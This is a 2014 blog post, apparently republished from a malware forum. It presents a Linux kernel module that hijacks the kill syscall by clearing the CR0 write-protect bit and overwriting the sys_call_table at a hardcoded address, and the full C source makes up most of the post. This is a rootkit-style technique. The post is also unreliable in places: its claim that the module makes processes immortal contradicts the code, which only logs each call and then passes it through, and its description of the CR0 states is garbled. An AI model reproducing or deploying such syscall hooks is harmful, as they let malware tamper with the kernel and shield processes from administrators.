Today I come with a small demo of a hook in Ring0
that I just finished, which will serve to make all the processes in Ring3 immortal.

Since kernel versions 2.6, write permissions have been removed,  leaving read-only permissions and the syscall table cannot be exported.
So we must find another method to hooke the syscall table, one of them is looking in "boot/System.map" where you can find the addresses to the syscall(in my case System.map-3.2.6).

The standard **__NR_kill** is to hook **kill_pid** but if you want another function just look at the syscall_table and look for the correct **NR**.
In order to allow read/write and make a successful hook we need to momentarily disable the CR0(control register) bit which is in charge of protecting memory sections against writes.
CR0 has 2 states:<br/>
```
0x0000 = read/write mode.
0x0001 = write mode.
```

The 2 functions that I will use for this are native_read_cr0 and native_write_cr0 which will allow us to alter their states.<br/>
In my case the System.map-3.2.6 file contained the pointer to the *syscall table* and *kill pid* at the following addresses:
```
25940 - c1562120 R sys_call_table
2169 - c105bb80 T kill_pid
```

So on your systems it may not work, this is why I mentioned above to look at the **System.map** file, if you try it on your own....
Once the driver is installed if we try to kill any process, this is what happens.

![1](/images/1.png)

Once uninstalled, the processes can be killed normally:

![2](/images/2.png)

Code:
```C
/*
	Author: NvK
	Thanks to: http://memset.wordpress.com/2010/12/03/syscall-hijacking-kernel-2-6-systems/
	Description: Makes all processes in ring3 immortal
*/
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/unistd.h>
#include <linux/mm.h>
#include <linux/highmem.h>

#include <asm/cacheflush.h>
#include <asm/io.h>
#include <asm/setup.h>
#include <asm/system.h>
#include <asm/pgtable.h>
#include <asm/pgalloc.h>

#define ELF_INITED 		".text.data"
#define ELF_BEGIN		".text.text"

static unsigned long kill_calls= 0;
// Puntero a la tabla
unsigned long *sys_call_table= (unsigned long*)0xc1562120;
// Función restaurada...
asmlinkage int (*original_kill)(pid_t, int);

int call_x86_hook_kill(pid_t pid, int sig)
{
	printk(KERN_ALERT "\n[+] x86 kill Hooked %ld", kill_calls++);
	return (*original_kill)(pid, sig);
}

static int __section(.init.text)__attribute__((cold)) notrace INIT_KERNEL(void)
{
	// desactivar bit de control
	native_write_cr0(native_read_cr0()&(~0x10000));
	
	original_kill= (void *)sys_call_table[__NR_kill];
	sys_call_table[__NR_kill]= call_x86_hook_kill;
	
	// activar bit de control(volver a su estado normal)
	native_write_cr0(native_read_cr0() | 0x10000);
  
  return 0;
}

static void __section(.exit.data) EXIT_KERNEL(void)
{
	native_write_cr0(native_read_cr0()&(~0x10000));
	sys_call_table[__NR_kill]= original_kill;
	native_write_cr0(native_read_cr0() | 0x10000);
	
	return;
}

module_init(INIT_KERNEL);
module_exit(EXIT_KERNEL);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Nvk");
MODULE_DESCRIPTION("ring0 x86 hook - [kill poc]");
```

if you just want to know how many times the system has made the syscall change the following line:

> int call_x86_hook_kill(pid_t pid, int sig)

for this one:

> asmlinkage call_x86_hook_kill(pid_t pid, int sig)


My original post: https://indetectables.net/viewtopic.php?t=50056
Date: May 26, 2014
